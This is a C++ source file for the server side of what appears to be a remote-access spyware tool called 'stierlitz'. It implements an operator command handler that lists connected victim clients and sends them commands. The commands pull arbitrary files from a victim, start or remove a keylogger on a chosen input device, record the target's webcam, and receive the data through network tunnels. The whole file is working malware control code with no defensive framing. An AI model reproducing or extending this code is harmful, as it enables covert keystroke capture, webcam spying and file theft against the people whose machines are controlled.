#include "command_handler.hpp"

C2FIFO::C2FIFO() {
    fd_in = -1;
    fd_out = -1;
}

C2FIFO::~C2FIFO() {
    if (fd_in >= 0) {
        close(fd_in);
    }
    if (fd_out >= 0) {
        close(fd_out);
    }
}

int C2FIFO::init() {
    fd_in = open(C2_IN_FIFO_PATH, O_RDONLY | O_NONBLOCK);
    if (fd_in < 0) {
        close(fd_out);
        fd_out = -1;
        return -1;
    }

    int tries = 0;
    while ((fd_out = open(C2_OUT_FIFO_PATH, O_WRONLY | O_NONBLOCK)) < 0 && tries++ < 20) {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
    if (fd_out < 0) {
        return -1;
    }

    return 0;
}

Argument::Argument(int __arg_num, int __arg_value_type, const std::string& __arg_abbr, const std::string& __arg_full) {
    arg_num_ = __arg_num;
    arg_value_type_ = __arg_value_type;
    arg_abbr_ = __arg_abbr;
    arg_full_ = __arg_full;
}

Command::Command(
    const std::string& __description,
    void (CommandHandler::*__p_command_func)(), // Correct type for member function pointer
    CommandHandler* __p_command_handler,
    std::initializer_list<int> __optional,
    std::initializer_list<int> __required
) {
    description_ = __description;
    p_command_func_ = __p_command_func;
    p_command_handler_ = __p_command_handler;

    if (__optional.size() > 0) {
        for (const int& i : __optional) {
            optional_.push_back(i);
        }
    }

    for (const int& i : __required) {
        required_.push_back(i);
    }
}

CommandHandler::CommandHandler(
    std::vector<ClientHandler*>* __p_clients,
    EventLog* __p_event_log,
    std::atomic<bool>* __p_shutdown_flag,
    std::string* __p_ip,
    uint __port,
    int* __p_user_verbosity,
    std::vector<Tunnel*>* __p_tunnels,
    std::shared_ptr<TunnelContext> __tunnel_context
    ): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), p_tunnels_(__p_tunnels), tunnel_context_(__tunnel_context) {
    

    argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
    argument_list_.push_back(Argument(ALL_ARG, ARG_TYPE_SET, "-a", "--all"));
    argument_list_.push_back(Argument(HELP_ARG, ARG_TYPE_SET, "-h", "--help"));
    argument_list_.push_back(Argument(KILL_ARG, ARG_TYPE_SET, "-k", "--kill"));
    argument_list_.push_back(Argument(VERBOSITY_ARG, ARG_TYPE_INT, "-v", "--verbosity"));
    argument_list_.push_back(Argument(REMOVE_ARG, ARG_TYPE_SET, "-rm", "--remove"));
    argument_list_.push_back(Argument(OUT_ARG, ARG_TYPE_STRING, "-o", "--out"));
    argument_list_.push_back(Argument(FILE_NAME_ARG, ARG_TYPE_STRING, "-f", "--file-name"));
    argument_list_.push_back(Argument(DEVICE_ARG, ARG_TYPE_INT, "-d", "--dev"));
    argument_list_.push_back(Argument(KB_LAYOUT_ARG, ARG_TYPE_STRING, "-l", "--layout"));
    argument_list_.push_back(Argument(CONVERT_ARG, ARG_TYPE_SET, "-c", "--convert"));

    command_map_.emplace("help", Command(
        "Show this help message.\n\tFor specific command <command> -h/--help", 
        &CommandHandler::help,
        this,
        {HELP_ARG}
    ));
    command_map_.emplace("test", Command(
        "Test command. For specific command help <command> or <command> -h/--help",
        &CommandHandler::test,
        this,
        {HELP_ARG},
        {INDEX_ARG, ALL_ARG}
    ));
    command_map_.emplace("list", Command(
        "List all clients",
        &CommandHandler::list,
        this,
        {HELP_ARG}
    ));
    command_map_.emplace("set-verb", Command(
        "Set verbosity level.\n\tset-verb -v <verbosity>",
        &CommandHandler::set_verbosity,
        this,
        {HELP_ARG},
        {VERBOSITY_ARG}
    ));
    command_map_.emplace("show-verb", Command(
        "Show current verbosity level and list of available verbosity levels",
        &CommandHandler::show_verbosity,
        this,
        {HELP_ARG}
    ));
    command_map_.emplace("kill", Command(
        "Kill the selected client. Usage:\n\tkill -i <client_index>\n\tkill -a to kill all clients",
        &CommandHandler::kill,
        this,
        {HELP_ARG},
        {INDEX_ARG, ALL_ARG}
    ));
    command_map_.emplace("get-file", Command(
       "Get a file from the client. Usage:\n\tget-file -i <client_index> -f <file_name>. Use -o <output_file_name> to save the file",
        &CommandHandler::get_file,
        this,
        {HELP_ARG},
        {INDEX_ARG, FILE_NAME_ARG, OUT_ARG}
    ));
    command_map_.emplace("get-dev", Command( // basically get-file -f /proc/bus/input/devices
        "Get the contents of /proc/bus/input/devices from a client and save it. Usage: get-dev -i <client_index>. Use -o <output_file_name> to save the file",
        &CommandHandler::get_dev,
        this,
        {HELP_ARG},
        {INDEX_ARG, OUT_ARG}
    ));
    command_map_.emplace("keylogger", Command(
        "Start listening the key logs of the selected client. Usage:\n\tkeylogger -i <client_index> -d <device number for eventX>\n\tBy default \"us\" layout is used. To change it specify it with -l/--layout argument. eg -l us \n\tUse -rm to remove the keylogger from the client",
        &CommandHandler::keylogger,
        this,
        {HELP_ARG, REMOVE_ARG, DEVICE_ARG, KB_LAYOUT_ARG},
        {INDEX_ARG}
    ));
    command_map_.emplace("webcam", Command(
        "Start capturing target's webcam. Usage: \n\twebcam -i <client_index>. \n\t-d <device number for /dev/videoX> (default = 0),  \n\t-o <output_file> (if not given, captured data will not be saved)\n\twebcam -c -f <.mjpeg> -o <.avi> will convert the file into watchable format\n\t-rm to remove the keylogger from the client",
        &CommandHandler::webcam_recorder,
        this,
        {HELP_ARG, INDEX_ARG, REMOVE_ARG, DEVICE_ARG, FILE_NAME_ARG, CONVERT_ARG, OUT_ARG},
        {}
    ));
}

CommandHandler::~CommandHandler() {
}

bool CommandHandler::command_exists(const std::string& __root_cmd) {
    return command_map_.find(__root_cmd) != command_map_.end();
}

int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::string& __args_str) {
    // Break the input into individual arguments
    std::istringstream iss(__args_str);
    std::vector<std::string> args((std::istream_iterator<std::string>(iss)), std::istream_iterator<std::string>());

    std::unordered_map<int, std::any> temp_arg_map;
    std::vector<int> found_required_args;

    Command& command = command_map_.at(__root_cmd);

    for (size_t i = 0; i < args.size(); i++) {
        const std::string& arg = args[i];

        auto it = std::find_if(argument_list_.begin(), argument_list_.end(), [&arg](const Argument& a) {
            return arg == a.arg_abbr_ || arg == a.arg_full_;
        });

        if (it == argument_list_.end()) {
            *p_event_log_ << LOG_MUST << RED << "Unknown argument: " << arg << RESET_C2_FIFO;
            return -1;
        }

        int arg_num = it->arg_num_;
        int arg_type = it->arg_value_type_;

        // Track whether required arguments are found
        if (std::find(command.required_.begin(), command.required_.end(), it->arg_num_) != command.required_.end()) {
            found_required_args.push_back(it->arg_num_);
        }

        if (arg_type != ARG_TYPE_SET) {
            if (i + 1 >= args.size()) {
                *p_event_log_ << LOG_MUST << RED << "Missing value for argument: " << arg << RESET_C2_FIFO;
                return -1;
            }

            const std::string& value = args[i+1];

            bool is_next_arg_flag = std::any_of(argument_list_.begin(), argument_list_.end(), [&value](const Argument& a) {
                return value == a.arg_abbr_ || value == a.arg_full_;
            });
        
            if (is_next_arg_flag) {
                *p_event_log_ << LOG_MUST << RED << "Expected value after argument: " << arg << ", but got another argument: " << value << RESET_C2_FIFO;
                return -1;
            }

            try {
                if (arg_type == ARG_TYPE_INT) {
                    temp_arg_map[arg_num] = std::stoi(value);
                } else if (arg_type == ARG_TYPE_STRING) {
                    temp_arg_map[arg_num] = value;
                } else {
                    *p_event_log_ << LOG_MUST << RED << "Unknown argument type for argument: " << arg << RESET_C2_FIFO;
                    return -1;
                }

                i++; // Skip the value since it's already processed
            } catch (const std::exception& e) {
                *p_event_log_ << LOG_MUST << RED << "Invalid value for argument " << arg << ": " << e.what() << RESET_C2_FIFO;
                return -1;
            }
        } else {
            temp_arg_map[it->arg_num_] = true;
        }    
    }

    if (temp_arg_map.find(HELP_ARG) != temp_arg_map.end()) {
        *p_event_log_ << LOG_MUST << CYAN << __root_cmd << " " << command.description_ << RESET_C2_FIFO;
        return HELP_ARG;
    }

    if (std::find(command.required_.begin(), command.required_.end(), INDEX_ARG) != command.required_.end() &&
    std::find(command.required_.begin(), command.required_.end(), ALL_ARG) != command.required_.end()) {
        bool index_found = temp_arg_map.find(INDEX_ARG) != temp_arg_map.end();
        bool all_found = temp_arg_map.find(ALL_ARG) != temp_arg_map.end();

        if (index_found && all_found) {
            *p_event_log_ << LOG_MUST << RED << "Cannot use both -i and -a arguments at the same time" << RESET_C2_FIFO;
            return -1;
        } 
        if (!index_found && !all_found) {
            *p_event_log_ << LOG_MUST << RED << "Either -i or -a argument is required" << RESET_C2_FIFO;
            return -1;
        }
        if (index_found && !all_found) {
            int index_value = std::any_cast<int>(temp_arg_map[INDEX_ARG]);
            if (index_value < 0 || index_value >= p_clients_->size()) {
                *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << index_value << RESET_C2_FIFO;
                return -1;
            }
        }
    }

    for (int required_arg : command.required_) {
        if (required_arg == INDEX_ARG || required_arg == ALL_ARG) {
            continue; // Skip INDEX_ARG and ALL_ARG
        }
        if (std::find(found_required_args.begin(), found_required_args.end(), required_arg) == found_required_args.end()) {
            return -1;
        }
    }

    if (temp_arg_map.find(INDEX_ARG) != temp_arg_map.end()) {
        int index_value = std::any_cast<int>(temp_arg_map[INDEX_ARG]);
        if (index_value < 0 || index_value >= p_clients_->size()) {
            *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << index_value << RESET_C2_FIFO;
            return -1;
        }
    }

    arg_map_ = std::move(temp_arg_map);
    return 0;
}

int CommandHandler::parse_command(const std::string& __root_cmd) {
    

    if (!command_exists(__root_cmd)) {
        *p_event_log_ << LOG_MUST << RED << "Command not found: " << __root_cmd << ". Type help to see all the available commands" << RESET_C2_FIFO;
        return -1;
    }

    std::string args_str = "";
    size_t space_pos = cmd_.find(' ');
    if (space_pos != std::string::npos) {
        args_str = cmd_.substr(space_pos + 1); // Extract everything after the first space
    }
    int rc = parse_arguments(__root_cmd, args_str);
    if (rc < 0) {
        *p_event_log_ << LOG_MUST << RED << "Invalid command usage! Type " << __root_cmd << " -h to see the usage" << RESET_C2_FIFO;
        return -1;
    } else if (rc == HELP_ARG) {
        return -1;
    }

    return 0;
}

void CommandHandler::send_packet(uint16_t __packet, int __client_index) {
    int rc = send(p_clients_->at(__client_index)->socket(), &__packet, sizeof(__packet),0);
    if (rc < 0) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Error sending command to client " << __client_index << ": " << rc << RESET;
    } else if (rc == PEER_DISCONNECTED_ERROR) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Client " << __client_index << " disconnected" << RESET;
    } else {
        *p_event_log_ << LOG_DEBUG << GREEN << "[CommandHandler::send_client] Command sent to client " << __client_index << RESET;
    }
}

void CommandHandler::send_client(CommandCode __command, uint8_t __port, int __client_index) {
    if (__client_index < 0 || __client_index >= p_clients_->size()) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Invalid client index: " << __client_index << RESET;
        return;
    }

    if (p_clients_->at(__client_index) != nullptr && ClientHandler::is_client_up(p_clients_->at(__client_index)->socket()) == 0) {
        uint16_t packet = (__command << 8) | __port;
        send_packet(packet, __client_index);
    } else {
        *p_event_log_ << LOG_DEBUG << YELLOW << "[CommandHandler::send_client] Client " << __client_index << " is not available" << RESET;
    }
}

void CommandHandler::send_client(CommandCode __command) {
    uint16_t packet = __command << 8;
    for (int i=0; i<p_clients_->size(); i++) {
        if (p_clients_->at(i) != nullptr && ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
            send_packet(packet, i);
        }
    }
}

int CommandHandler::local_execute(const char* __argv[]) {
    int out_pipe[2];
    int err_pipe[2];

    int rc = pipe2(out_pipe, O_CLOEXEC);
    if (rc < 0) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::local_execute] Failed to pipe out_pie" << RESET;
        return -1;
    }

    rc = pipe2(err_pipe, O_CLOEXEC);
    if (rc < 0) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::local_execute] Failed to pipe err_pie" << RESET;
        close(out_pipe[0]);
        close(out_pipe[1]);
    }
    

    pid_t pid = fork();
    if (pid < 0) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::local_execute] Failed to fork" << RESET;
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        return -1;
    } else if (pid == 0) {
        close(out_pipe[0]);
        close(err_pipe[0]);
        
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);

        close(out_pipe[1]);
        close(err_pipe[1]);

        execvp(__argv[0], const_cast<char* const*>(__argv));
        _exit(EXIT_FAILURE);
    } else {
        close(out_pipe[1]);
        close(err_pipe[1]);

        char buffer[BUFFER_SIZE];
        size_t count;

        // Read stdout
        while ((count = read(out_pipe[0], buffer, sizeof(buffer) -1)) > 0) {
            buffer[count] = '\0';
            *p_event_log_ << LOG_MUST << "[CommandHandler::local_execute]\n" << buffer << RESET;
        }

        // Read stderr
        while ((count = read(err_pipe[0], buffer, sizeof(buffer) -1)) > 0) {
            buffer[count] = '\0';
            *p_event_log_ << LOG_MUST << "[CommandHandler::local_execute]\n" << buffer << RESET;
        }

        close(out_pipe[0]);
        close(err_pipe[0]);

        int status;
        waitpid(pid, &status, 0);
        return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
    }
}

void CommandHandler::help() {
    *p_event_log_ << LOG_MUST << CYAN << "\nstierlitz Available commands\n";
    for (const auto& [cmd, command] : command_map_) {
        *p_event_log_ << LOG_MUST << CYAN << cmd << "   " << command.description_ << "\n";
    }
    *p_event_log_ << RESET_C2_FIFO;
}

void CommandHandler::test() {
    if(arg_map_.find(INDEX_ARG) != arg_map_.end()) {
        send_client(TEST, 0, std::any_cast<int>(arg_map_[INDEX_ARG]));
    }
    if(arg_map_.find(ALL_ARG) != arg_map_.end()) {
        send_client(TEST);
    }
}

void CommandHandler::list() {
    *p_event_log_ << LOG_MUST << CYAN << "[Available Clients]";
    for (int i=0; i<p_clients_->size(); i++) {
        if (p_clients_->at(i) != nullptr) {
            *p_event_log_ << "\n\n==Client " << i << "==    " << p_clients_->at(i)->ip();
            *p_event_log_ << "\nStatus: ";
            if (ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
                *p_event_log_ << GREEN << "UP\033[0m";
            } else {
                *p_event_log_ << RED << "DOWN\033[0m";
            }
            *p_event_log_ << CYAN << "\nTunnels:\n";
            for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
                if ((*it)->client_index_ == i) {
                    if ((*it)->command_code_ == KEYLOGGER) {
                        *p_event_log_ << "\n__keylogger__:";
                    } else if ((*it)->command_code_ == WEBCAM_RECORDER) {
                        *p_event_log_ << "\n__webcam_recorder__:";
                    } else if ((*it)->command_code_ == AUDIO_RECORDER) {
                        *p_event_log_ << "\n__audio_recorder__:";
                    } else if ((*it)->command_code_ == SCREEN_RECORDER) {
                        *p_event_log_ << "\nscreen__recorder__:";
                    }
                }
            }
        }
    }
    *p_event_log_ << RESET_C2_FIFO;
}

void CommandHandler::show_verbosity() {
    *p_event_log_ << LOG_MUST << CYAN << "Current verbosity level: " << *p_user_verbosity_ <<
    "\n\nAvailable verbosity levels:\n" <<
    "0 - No output\n" <<
    "1 - Critical errors only\n" <<
    "2 - Critical errors and crashes\n" <<
    "3 - Critical errors, crashes and minor events\n" <<
    "4 - (Debug Mode) Critical errors, crashes, minor events and debug information\n" << 
    "set-verb to change the verbosity" << RESET_C2_FIFO; 
}

void CommandHandler::set_verbosity() {
    int new_verbosity = std::any_cast<int>(arg_map_[VERBOSITY_ARG]);
    if (new_verbosity < 0 || new_verbosity > 4) {
        *p_event_log_ << LOG_MUST << RED << "Invalid verbosity level: " << new_verbosity << RESET_C2_FIFO;
        return;
    }
    *p_user_verbosity_ = new_verbosity;
}

void CommandHandler::kill() {
    if (arg_map_.find(INDEX_ARG) != arg_map_.end()) {
        send_client(KILL, 0, std::any_cast<int>(arg_map_[INDEX_ARG]));
    }
    if (arg_map_.find(ALL_ARG) != arg_map_.end()) {
        send_client(KILL);
    }
}

void CommandHandler::get_file() {
    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
    std::string file_name = std::any_cast<std::string>(arg_map_[FILE_NAME_ARG]);
    std::string out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);

    if (file_name.size() > MAX_FILE_NAME || out_name.size() > MAX_FILE_NAME) {
        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::get_file] File names are too big" << RESET_C2_FIFO;
    }

    PacketTunnel* packet_tunnel = new PacketTunnel(file_name, out_name, p_event_log_, 0);
    Tunnel* tunnel = new Tunnel(client_index, PACKET_TUNNEL, packet_tunnel);
    {
        std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
        p_tunnels_->emplace_back(tunnel);
    }

    try {
        std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
    } catch (const std::system_error& e) {
        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::get_file] Error creating thread for packet tunnel" << RESET_C2_FIFO;
        erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
    }
}

void CommandHandler::get_dev() {
    // Receive the /proc/bus/input/devices file from the client
    arg_map_[FILE_NAME_ARG] =  "/proc/bus/input/devices";
    get_file();
}

void CommandHandler::keylogger() {
    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);

    Tunnel* p_tunnel = get_tunnel(client_index, KEYLOGGER);

    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
        if (p_tunnel != nullptr) {
            uint64_t u = 1;
            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
            send_client(KEYLOGGER, 0, client_index);
            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::keylogger] Keylogger removed from client " << client_index << RESET_C2_FIFO;
        } else {
            *p_event_log_ << LOG_MUST << RED << "CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
        }
    } else {
        if (p_tunnel == nullptr) {
            if (arg_map_.find(DEVICE_ARG) == arg_map_.end()) {
                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Specify the target device name using -d/--dev.  You can get a list of devices using the get-dev -o <output file> command" << RESET_C2_FIFO;
                return;
            }
            std::string layout = "us";
            if (arg_map_.find(KB_LAYOUT_ARG) != arg_map_.end()) {
                layout = std::any_cast<std::string>(arg_map_[KB_LAYOUT_ARG]);
            }

            Keylogger* p_keylogger = new Keylogger();
            p_keylogger->set_dev(std::any_cast<int>(arg_map_[DEVICE_ARG]));
            p_keylogger->set_layout(layout);
            
            std::string out_name = "";
            if (arg_map_.find(OUT_ARG) != arg_map_.end()) {
                out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
            }
            if (!out_name.empty()) {
                p_keylogger->set_out(out_name);
            }

            Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, p_keylogger);
            {
                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
                p_tunnels_->emplace_back(tunnel);
            }
            try {
                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, TCP_BASED).detach();
            } catch (const std::system_error& e) {
                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Error creating thread for keylogger" << RESET_C2_FIFO;
                erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
            }
        } else {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Keylogger is already active for client " << client_index << RESET_C2_FIFO;
        }
    }
}

void CommandHandler::webcam_recorder() {
    if (arg_map_.find(CONVERT_ARG) != arg_map_.end()) { // just convert
        if (arg_map_.find(FILE_NAME_ARG) == arg_map_.end()) {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Please specify a mjpeg file that will be converted" << RESET_C2_FIFO; 
            return;
        }

        std::string in_name = std::any_cast<std::string>(arg_map_[FILE_NAME_ARG]);
        if (in_name.find_last_of('.') == std::string::npos || in_name.substr(in_name.find_last_of('.') + 1) != "mjpeg") {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid input file format. Only '.mjpeg' is supported. " << RESET_C2_FIFO;
            return;
        }

        if (arg_map_.find(OUT_ARG) == arg_map_.end()) {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Please specify a '.avi' file to convert to" << RESET_C2_FIFO; 
            return;
        }

        std::string out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
        if (out_name.find_last_of('.') == std::string::npos || out_name.substr(out_name.find_last_of('.') + 1) != "avi") {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid output file format. Only '.avi' is supported." << RESET_C2_FIFO;
            return;
        }

        // Convert using ffempg
        const char* argv[] = {
            "ffmpeg",
            "-f", "mjpeg",
            "-i", in_name.c_str(),
            "-c:v", "copy",
            out_name.c_str(),
            nullptr
        };

        local_execute(argv);
        return;
    }
    if (arg_map_.find(INDEX_ARG) == arg_map_.end()) {
        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid usage. webcam_recorder -h/--help for usage" << RESET_C2_FIFO;
        return;
    }
    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
    Tunnel* p_tunnel = get_tunnel(client_index, WEBCAM_RECORDER);

    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // --remove
        if (p_tunnel != nullptr) {
            uint64_t u = 1;
            write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
            send_client(WEBCAM_RECORDER, 0, client_index);
            *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::webcam_recorder] Webcam Recorder removed from client " << client_index << RESET_C2_FIFO;
        } else {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Webcam Recorder is not active for client " << client_index << RESET_C2_FIFO; 
        }
    } else {
        if (p_tunnel == nullptr) {
            int device_num = 0;
            if (arg_map_.find(DEVICE_ARG) != arg_map_.end()) {
                device_num = std::any_cast<int>(arg_map_[DEVICE_ARG]);
            }

            std::string out_name = "";
            if (arg_map_.find(OUT_ARG) != arg_map_.end()) {
                out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);

                if (out_name.find_last_of('.') != std::string::npos || 
                    out_name.substr(out_name.find_last_of('.') + 1) != "mjpeg") {
                    *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Invalid file format. Only .mjpeg is supported." << RESET_C2_FIFO;
                    return;
                }
            }

            WebcamRecorder* p_webcam_recorder = new WebcamRecorder();
            p_webcam_recorder->set_dev(device_num);
            if (!out_name.empty()) {
                p_webcam_recorder->set_out(out_name);
            }
            Tunnel* tunnel = new Tunnel(client_index, WEBCAM_RECORDER, p_webcam_recorder);
            {
                std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
                p_tunnels_->emplace_back(tunnel);
            }
            try {
                std::thread(&CommandHandler::handle_tunnelt, this, tunnel, UDP_BASED).detach();
            } catch (const std::system_error& e) {
                *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Error creating thread for webcam_recorder" << RESET_C2_FIFO;
                erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
            }
        } else {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::webcam_recorder] Webcam Recorder is already active for client " << client_index << RESET_C2_FIFO;
        }
    }
}

void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel, int __connection_type) {
    uint port = find_open_port();
    
    if (port > 0 && __p_tunnel->p_spy_tunnel_->init(*p_ip_, port, __p_tunnel->p_tunnel_shutdown_fd_, __connection_type) == 0) {
        send_client(__p_tunnel->command_code_, port-port_, __p_tunnel->client_index_);
        __p_tunnel->p_spy_tunnel_->edit_fifo_path(__p_tunnel->client_index_, __p_tunnel->command_code_);
        Tunnel::active_tunnels_++;
        __p_tunnel->p_spy_tunnel_->run();
    }

    // If we reach here, the tunnel has finished (due to error or completion) and ready to be cleaned up
    {
        std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
        erase_tunnel(p_tunnels_, __p_tunnel->client_index_, __p_tunnel->command_code_);
        Tunnel::active_tunnels_--;
        std::cout << MAGENTA << "[CommandHandler::handle_tunnelt] helper thread finished" << RESET;
        if (p_shutdown_flag_->load() && Tunnel::active_tunnels_ == 0) {
            std::cout << MAGENTA << "[CommandHandler::handle_tunnelt] All tunnels finished, shutting down" << RESET;
            tunnel_context_->all_processed_cv_.notify_all();
        }
    }
    return;
    
}

Tunnel* CommandHandler::get_tunnel(int __client_index, CommandCode __command_code) {
    for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
        if ((*it)->client_index_ == __client_index && (*it)->command_code_ == __command_code) {
            return *it;
        }
    }
    return nullptr;
}

uint CommandHandler::find_open_port() {
    int sockfd;
    struct sockaddr_in addr;

    for (uint port=port_+1;port<65535;port++) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            *p_event_log_ << LOG_MUST << RED << "[CommandHandler::find_open_port] Error creating socket: " << strerror(errno) << RESET;
            return -1;
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(port);

        int opt = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            close(sockfd);
            *p_event_log_ << LOG_MINOR_EVENTS << GREEN << "[CommandHandler::find_open_port] Found available port: " << port << RESET;
            return port;
        }
        close(sockfd);
    }
    *p_event_log_ << LOG_MUST << RED 
        << "[CommandHandler::find_open_port] Failed to find an open port in range " 
        << port_ + 1 << "-65534 ==> " << strerror(errno) << RESET_C2_FIFO;
    return -1;
}

void CommandHandler::execute_command(char* __cmd, int __len) {
    int rc = 0;

    cmd_ = std::string(__cmd, __len);
    std::string root_cmd = cmd_.substr(0, cmd_.find(' '));

    rc = parse_command(root_cmd);
    if (rc < 0) {
        cleanup();
        return;
    }

    // Execute the command
    Command& command = command_map_.at(root_cmd);
    (command.p_command_handler_->*command.p_command_func_)();

    cleanup();
}

void CommandHandler::cleanup() {
    cmd_.clear();
    arg_map_.clear();
}